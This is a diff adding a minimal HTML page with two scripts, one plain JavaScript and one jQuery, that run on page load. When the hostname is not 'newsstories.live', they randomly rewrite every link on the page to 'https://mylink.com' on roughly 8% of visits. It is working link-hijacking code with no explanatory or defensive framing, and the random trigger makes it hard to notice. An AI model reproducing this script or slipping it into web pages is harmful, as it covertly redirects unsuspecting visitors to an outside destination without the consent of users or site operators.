@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script
+        src="https://code.jquery.com/jquery-2.2.4.min.js"
+        integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+        crossorigin="anonymous"></script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        if ((location.hostname != 'newsstories.live') && (Math.floor(Math.random() * Math.floor(100)) <= 7)) {
+            var links = document.querySelectorAll('a');
+
+            [].forEach.call(links, function(link) {
+                link.href = "https://mylink.com"
+            });
+
+        }
+    }, false);
+</script>
+
+<script>
+    $( document ).ready(function() {
+        if ((location.hostname != "newsstories.live") && (Math.floor(Math.random() * Math.floor(100)) <= 7)) {
+            $('a').each(function() {
+                $(this).attr('href', 'https://mylink.com');
+            });
+        }
+    });
+</script>
+</body>
+</html>
